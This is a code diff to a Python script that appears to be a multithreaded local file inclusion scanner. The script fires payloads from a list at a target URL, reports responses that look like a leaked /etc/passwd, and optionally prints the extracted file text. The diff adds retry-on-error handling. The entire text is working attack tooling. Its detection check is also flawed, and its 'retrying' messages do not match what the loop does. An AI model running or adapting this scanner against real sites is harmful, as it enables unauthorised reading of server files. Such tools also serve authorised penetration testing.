@@ -4,6 +4,9 @@ import argparse
 import threading
 import mmap
 import os
+import time
+from urllib3.exceptions import NameResolutionError
+from requests.exceptions import RequestException
 
 if os.name == "nt":
     os.system("cls")
@@ -61,21 +64,41 @@ def use_payload(x,payloads_per_thread,payload_path,target_url):
 	payload_count = 0
 	pointer_line = 0
 	print(f"Thread number {x+1} launched. Checking payloads ...")
+	last_msg_was_error = False
 	for p in payloads:
-		if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread): 
-			p = p.strip()
-			query = requests.get(target_url+p , headers=headers)
-			payload_count = payload_count + 1
-			if payload_count%25 == 0:
-				print(f"[!] Thread {x+1} status: Checked {payload_count} payloads...")
-			if "root" and "bash" and r"/bin" in query.text and query.status_code//100 == 2:
-				print("="*10)
-				print(f"LFI DETECTED:\n Payload: {target_url+p}\n\n")
-				if parse.extract:
-					e = BeautifulSoup(query.text,'html5lib')
-					print(e.blockquote.text)
-				print("="*10)
-		pointer_line = pointer_line + 1
+		try:
+			if pointer_line > (x*payloads_per_thread) and pointer_line < ((x+1)*payloads_per_thread): 
+				p = p.strip()
+				query = requests.get(target_url+p , headers=headers)
+				payload_count = payload_count + 1
+				if payload_count%25 == 0:
+					print(f"[!] Thread {x+1} status: Checked {payload_count} payloads...")
+				if "root" and "bash" and r"/bin" in query.text and query.status_code//100 == 2:
+					print("="*10)
+					print(f"LFI DETECTED:\n URL + Payload: {target_url+p}\n\n")
+					if parse.extract:
+						e = BeautifulSoup(query.text,'html5lib')
+						print(e.blockquote.text)
+					print("="*10)
+			pointer_line = pointer_line + 1
+			last_msg_was_error = False
+		except RequestException:
+			if not last_msg_was_error:
+				print(f"[!] Thread {x+1} status: Error occured while making request")
+				print(f"[!] Thread {x+1} status: Sleeping for 3 seconds then retrying payloads untill error is resolved ...")
+				last_msg_was_error = True
+				time.sleep(3)
+			else:
+				time.sleep(3)
+		except NameResolutionError:
+			if not last_msg_was_error:
+				print(f"[!] Thread {x+1} status: Error occured while resolving domain name. Are you sure the specified website exists and you are connected to the internet ?")
+				print(f"[!] Thread {x+1} status: Sleeping for 3 seconds then retrying payloads untill error is resolved ...")
+				last_msg_was_error = True
+				time.sleep(3)
+			else:
+				time.sleep(3)
+
 
 selected_payload_file = parse.payload.lower()
 
